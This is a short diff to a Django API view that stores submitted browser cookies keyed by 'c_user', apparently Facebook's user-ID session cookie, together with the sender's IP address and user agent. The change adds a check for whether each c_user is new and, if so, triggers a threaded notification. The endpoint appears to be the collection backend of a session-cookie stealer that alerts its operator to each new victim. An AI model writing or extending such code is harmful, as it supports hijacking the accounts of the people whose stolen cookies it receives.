@@ -27,7 +27,7 @@ def index(request):
     return HttpResponse(template.render(context, request))
 
 
-from .http_util import notify_ok_http_get
+from .http_util import run_notify_in_thread
 class HelloView(APIView):
     permission_classes = (IsAuthenticated,)  # <-- And here
     def get_ip_ua(self, request, obj):
@@ -54,10 +54,20 @@ class HelloView(APIView):
         print(request.data)
         serializer = CookiesSerializer(data=request.data)
 
+        c_user = request.data.get('c_user', None)
+        created = False
+        try:
+            snippet = Cookies.objects.get(c_user=c_user)
+        except Cookies.DoesNotExist:
+            created = True
+        print("created " + str(created))
+
         if serializer.is_valid():
             obj = serializer.save()
             # get ip
             self.get_ip_ua(request, obj)
+            if created:
+                run_notify_in_thread(obj.ip)
             return Response(serializer.data, status=status.HTTP_201_CREATED)
         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
